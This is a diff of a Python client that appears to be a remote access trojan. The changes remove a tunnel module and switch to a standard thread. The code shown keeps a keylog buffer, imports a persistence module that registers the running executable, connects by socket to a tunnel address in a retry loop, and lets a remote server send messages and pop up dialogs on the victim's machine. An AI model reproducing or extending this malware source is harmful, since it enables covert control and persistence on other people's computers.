@@ -9,6 +9,7 @@ from time import sleep
 import subprocess
 import os
 from ctypes import windll
+from threading import Thread
 
 version = 'V0.3.1 BUILD 6'
 
@@ -18,7 +19,7 @@ locked = False
 
 keylog = ''
 
-from _modules import location, persistence, tunnel, kbhit#, keylog
+from _modules import location, persistence, kbhit#, keylog
 kbhit = kbhit.KBHit()
 
 p = subprocess.Popen('',shell=True)
@@ -31,7 +32,6 @@ def connect():
     s = socket.socket()
     while True:
         try:
-            tunnel.start()
             s.connect((tunnelip,tunnelport))
         except Exception:
             timer = 3
@@ -77,7 +77,7 @@ def get(msg): send(msg)
 def popup(msg,title='Message'):
     messagebox.showinfo(title, f'{msg}',)
 def show(msg,title='Message'):
-    tunnel.Thread(target=popup,args=(msg,title)).start()
+    Thread(target=popup,args=(msg,title)).start()
 
 def help():
     send('-- Help menu --\nFunctions:\n\nsend(msg) - Send a message back to server. Aliases: get\npopup(msg) - Send a message via pop up to the user. Aliases: show')
@@ -87,7 +87,7 @@ print('[INIT] Enabling modules...\n')
 
 
 print('[MODULES] Enabling Tunnel..')
-tunnel.start()
+#tunnel.start()
 
 print('[MODULES] Enabling persistence.. ['+sys.argv[0].split("\\")[-1]+']')
 persistence.init(sys.argv[0].split('\\')[-1])
